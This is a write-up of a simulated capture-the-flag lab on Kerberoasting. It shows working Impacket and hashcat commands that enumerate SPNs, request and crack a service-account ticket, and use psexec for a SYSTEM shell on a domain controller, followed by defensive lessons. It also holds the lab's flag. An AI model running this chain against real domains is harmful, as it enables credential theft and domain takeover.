# M05 | Kerberoasting

**Mission difficulty:** HIGH  
**Status:** COMPLETED (4/4 steps)  
**Environment:** ACME.CORP Active Directory lab  
**Domain controller:** `10.0.0.1`  
**Initial credentials:** `ACME.CORP\student` / `password`  
**Target service account:** `ACME.CORP\svc_sql`  
**Recovered password:** `Summer2019!`  
**Recovered flag:** `559731c45deb90846d745be2192f536a`  
**Flag stored by simulator:** `~/flags/flag4.txt`

> **Scope:** This report documents the simulated, authorized lab exercise and reproduces its reported command output. Commands, credentials, and artifacts refer to this lab environment. Some terminal responses are simulator-generated rather than proof of execution against a live system.

## Executive summary

M05 demonstrated how low-privilege Active Directory credentials can be used to enumerate service principal names (SPNs) and request Kerberos service tickets. The lab identified a SQL Server service account, `svc_sql`, that belonged to **Domain Admins**. Its RC4-HMAC service ticket was saved in a Hashcat-compatible form and its password (`Summer2019!`) recovered with a dictionary attack. Those credentials were then used with Impacket PsExec to establish a shell reported as `NT AUTHORITY\SYSTEM` on the domain controller and read `C:\flag.txt`.

**Observed progression:** low-privilege domain authentication → SPN enumeration → TGS acquisition → offline password recovery → remote administrative execution → flag retrieval.

## Target and tools

| Item | Value |
|---|---|
| Domain | `ACME.CORP` |
| Domain controller | `10.0.0.1` |
| Initial account | `student` (low-privilege) |
| Target service account | `svc_sql` |
| Target SPN | `MSSQLSvc/db01.acme.corp:1433` |
| Privileged membership | `Domain Admins` |
| Password last set | `2019-08-01 00:00` (reported by simulator) |
| TGS encryption | Kerberos RC4-HMAC, etype 23 |
| Hashcat mode | `13100` |
| Wordlist | `/usr/share/wordlists/rockyou.txt` |
| Saved ticket artifact | `hashes.kerberoast` (as reported by simulator) |
| Access method | `impacket-psexec` over SMB |
| Retrieved file | `C:\flag.txt` |

---

## Step 1 | SPN enumeration

**Objective:** Identify accounts with SPNs and inspect their group memberships.

### Command

```bash
impacket-GetUserSPNs 'ACME.CORP/student:password' -dc-ip 10.0.0.1
```

### Parameters

| Parameter | Description |
|---|---|
| `impacket-GetUserSPNs` | Impacket utility that enumerates Active Directory service accounts registered with SPNs. |
| `'ACME.CORP/student:password'` | Domain, username, and password used for authenticated enumeration. Quotes keep the argument together. |
| `-dc-ip 10.0.0.1` | Send the directory/Kerberos-related queries to the specified domain controller. |

### Recorded response

```text
ServicePrincipalName                   Name     MemberOf         PasswordLastSet
-------------------------------------  -------  ---------------  ----------------
MSSQLSvc/db01.acme.corp:1433           svc_sql  Domain Admins    2019-08-01 00:00
HTTP/web01.acme.corp:80                svc_web  Web Servers       2020-01-15 00:00
BACKUP/backup01.acme.corp:445          svc_bak  Backup Operators  2018-11-03 00:00
[note] svc_sql is in Domain Admins! Cracking its TGS = Domain Admin access.
[+] Step 1/4 complete! Proceed to step 2.
```

### Interpretation

Three service accounts were found. `svc_sql` was prioritized because it had an MSSQL service SPN **and** membership in the highly privileged `Domain Admins` group. The old `PasswordLastSet` date suggested a long-lived credential but did not, on its own, prove the password was weak.

---

## Step 2 | Request the Kerberos service ticket

**Objective:** Obtain a TGS for `svc_sql` to analyze offline.

### Command entered

```bash
impacket-GetUserSPNs 'ACME.CORP/student:password' -dc-ip 10.0.0.1 -request-user svc_sql -outputfile svc_sql.hash
```

### Parameters

| Parameter | Description |
|---|---|
| `-request-user svc_sql` | Request service-ticket material specifically for the `svc_sql` account. |
| `-outputfile svc_sql.hash` | Requested destination file for the exported ticket data. |
| `-dc-ip 10.0.0.1` | Domain controller used for the request. |
| `ACME.CORP/student:password` | Authenticated low-privilege account making the request. |

### Recorded response (abbreviated ticket)

```text
impacket-GetUserSPNs -request ACME.CORP/student:password -dc-ip 10.0.0.1
[*] Getting TGS tickets for: svc_sql, svc_web, svc_bak
$krb5tgs$23$*svc_sql$ACME.CORP$MSSQLSvc/db01.acme.corp:1433*$
a4f3b2c1d0e9f8a7... [ticket material abbreviated]
[+] TGS ticket for svc_sql saved to hashes.kerberoast
[note] $23$ = RC4-HMAC = crackable offline. DC never logged this.
[+] Step 2/4 complete! Proceed to step 3.
```

### Interpretation and important details

- The `$krb5tgs$23$` prefix identifies Kerberos 5 TGS-REP material using **etype 23 (RC4-HMAC)**. Hashcat mode `13100` supports this format.
- The command requested `svc_sql.hash`, but the **simulator reported `hashes.kerberoast`** as the saved filename. Step 3 used the simulator-reported name.
- The simulated response also said it was getting tickets for all three accounts despite the `-request-user svc_sql` argument; this is a simulator inconsistency, not a normal inference from the command.
- **Logging correction:** Password guesses in Step 3 are offline, but the ticket request itself can be logged by the domain controller as **Windows Security Event ID 4769** if appropriate auditing is enabled. The lab's statement that the DC "never logged this" is not generally correct.

---

## Step 3 | Offline ticket password recovery

**Objective:** Test candidate passwords against the captured RC4-HMAC service-ticket material.

### Command

```bash
hashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt
```

### Parameters

| Parameter | Description |
|---|---|
| `hashcat` | Password-recovery utility used for offline candidate testing. |
| `-m 13100` | Hash mode for Kerberos 5 TGS-REP etype 23 (RC4-HMAC). |
| `-a 0` | Straight/dictionary attack using wordlist entries as candidates. |
| `hashes.kerberoast` | Exported TGS material, as named by the simulator. |
| `/usr/share/wordlists/rockyou.txt` | Dictionary of candidate passwords. |

### Recorded response (key excerpts)

```text
hashcat (v6.2.6) starting...
OpenCL API (OpenCL 3.0 ) - Platform #1 [Intel(R) Corporation]
  * Device #1: Intel(R) Core(TM) i7-8700K CPU @ 3.70GHz
Hashes: 1 digests; 1 unique digests, 1 unique salts
Dictionary cache built:
  Filename..: /usr/share/wordlists/rockyou.txt
  Passwords.: 14344385
  Keyspace..: 14344385
Progress...........: 1284096/14344385 (8.95%)
Progress...........: 3641344/14344385 (25.38%)
Progress...........: 6879232/14344385 (47.96%)
$krb5tgs$23$*svc_sql$ACME.CORP$MSSQLSvc/db01.acme.corp:1433*:Summer2019!
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5 TGS-REP etype 23
Recovered........: 1/1 (100.00%) Digests
Started: Sat Mar 15 09:22:14 2024
Stopped: Sat Mar 15 09:22:22 2024
[+] CRACKED: svc_sql --> Summer2019!
[+] Step 3/4 complete! Proceed to step 4.
```

### Result

| Metric | Observed result |
|---|---|
| Account | `svc_sql` |
| Recovered password | `Summer2019!` |
| Hash format | `$krb5tgs$23$` |
| Cracked digests | `1/1` |
| Reported duration | 8 seconds |
| Candidate wordlist size | 14,344,385 |

### Interpretation

This was an **offline dictionary attack**, not a direct online authentication or a password spray. Weak password selection made recovery possible. No further Kerberos requests are required to test individual dictionary candidates. RC4-HMAC service-ticket encryption uses the service account's NT hash as its RC4 key; this is distinct from a plain-text password being included in the ticket.

---

## Step 4 | Remote execution and flag retrieval

**Objective:** Use the recovered service-account credentials to reach the domain controller, verify the security context, and read the lab flag.

### Connection command

```bash
impacket-psexec 'ACME.CORP/svc_sql:Summer2019!@10.0.0.1'
```

### Parameters

| Component | Description |
|---|---|
| `impacket-psexec` | Impacket tool that uses SMB administrative access and service creation for remote command execution. |
| `ACME.CORP` | Active Directory domain. |
| `svc_sql` | Service account used to authenticate to the target. |
| `Summer2019!` | Password recovered in Step 3. |
| `@10.0.0.1` | Domain controller serving as the remote execution target. |
| Single quotes | Prevent the local shell from interpreting the `!` character in the password. |

### Verification and flag commands

```cmd
whoami
type C:\flag.txt
```

| Command | Description |
|---|---|
| `whoami` | Display the identity of the remote command shell's security token. |
| `type C:\flag.txt` | Print the contents of the mission flag file. |

### Recorded response

```text
kali@netprobe:/home/kali$ impacket-psexec 'ACME.CORP/svc_sql:Summer2019!@10.0.0.1'
[+] Found writable share ADMIN$ -- uploading service binary
[+] Shell opened as NT AUTHORITY\SYSTEM
C:\Windows\system32> whoami
nt authority\system
C:\> type C:\flag.txt
559731c45deb90846d745be2192f536a
[+] Kerberoasting complete: student -> Domain Admin shell
[note] Chain: student:pass -> SPN enum -> TGS -> crack -> DA shell.
flag captured: 559731c45deb90846d745be2192f536a
saved to ~/flags/flag4.txt
[+] Mission M05 complete: Kerberoasting
```

### Interpretation

The simulator reported a writable `ADMIN$` share, successful remote service execution, and `NT AUTHORITY\SYSTEM` as the remote shell identity. `svc_sql` credentials supplied the administrative access; **the command shell runs as SYSTEM**, not necessarily as the logged-in `svc_sql` identity. The final command read the flag successfully.

---

## Consolidated command reference

```bash
# Step 1: Enumerate SPNs
impacket-GetUserSPNs 'ACME.CORP/student:password' -dc-ip 10.0.0.1

# Step 2: Request a TGS for svc_sql
impacket-GetUserSPNs 'ACME.CORP/student:password' -dc-ip 10.0.0.1 -request-user svc_sql -outputfile svc_sql.hash

# Step 3: Offline dictionary recovery (simulator-reported ticket filename)
hashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt

# Step 4: Open the remote administrative shell
impacket-psexec 'ACME.CORP/svc_sql:Summer2019!@10.0.0.1'
```

```cmd
:: Inside the remote Windows shell
whoami
type C:\flag.txt
```

## Main security findings

| Finding | Evidence | Impact |
|---|---|---|
| Privileged service account has a requestable SPN | `svc_sql` / `MSSQLSvc/db01.acme.corp:1433` / `Domain Admins` | Creates a high-value target for Kerberoasting. |
| Weak long-lived service password | `PasswordLastSet` in 2019; password recovered as `Summer2019!` | Enables offline recovery of a privileged credential. |
| RC4-HMAC service ticket | `$krb5tgs$23$` | Exposes an offline password-verification target that is relatively inexpensive to test. |
| Domain controller administrative access | PsExec reported writable `ADMIN$` and SYSTEM shell | Allows remote execution on the domain controller. |
| Flag accessible with elevated access | `type C:\flag.txt` returned the mission flag | Confirms the lab's final objective. |

### Defensive lessons

- Do not grant **Domain Admins** membership to ordinary application service accounts. Apply least privilege.
- Prefer **group Managed Service Accounts (gMSAs)** or long, randomly generated service credentials.
- Reduce or disable unnecessary RC4 Kerberos encryption where compatibility permits; use stronger supported encryption types.
- Monitor Kerberos TGS requests (e.g., Event ID **4769**) and unusual administrative service creation or SMB remote-execution patterns.
- Restrict domain controller administrative access and administrative shares to the smallest necessary set of identities and management hosts.

## Final mission result

**M05 Kerberoasting: COMPLETED (4/4)**

- **Starting account:** `ACME.CORP\student`
- **Compromised account:** `ACME.CORP\svc_sql`
- **Recovered password:** `Summer2019!`
- **Privilege on target:** `NT AUTHORITY\SYSTEM` (as reported by the simulator)
- **Flag:** `559731c45deb90846d745be2192f536a`
- **Simulator output path:** `~/flags/flag4.txt`

**Overall takeaway:** A low-privilege authenticated user was able to obtain a service ticket for an overprivileged account, recover its weak password offline, and use the resulting credentials for high-privilege remote execution on the domain controller.
